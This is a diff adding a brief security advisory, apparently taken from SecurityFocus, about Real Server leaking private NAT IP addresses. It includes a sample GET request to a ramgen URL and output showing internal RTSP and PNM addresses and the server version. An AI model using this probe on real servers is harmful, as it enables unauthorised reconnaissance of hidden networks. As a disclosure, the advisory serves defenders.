@@ -1,0 +1,11 @@
+source: http://www.securityfocus.com/bid/1049/info
+
+By default, Real Server includes the IP address of the server in data sent to the client. If the Real Server is installed on a machine in a NAT environment, (where requests from the outside network are handled by reverse proxy), this will reveal what are supposed to be private, hidden IP addresses.
+
+$ GET http://realg2.example.com:8080/ramgen/foo.rm
+reveals-
+rtsp://192.168.11.12:554/foo.rm
+--stop--
+pnm://192.168.11.12:7070/foo.rm
+server info:
+WinNT Version 6.0.3.303
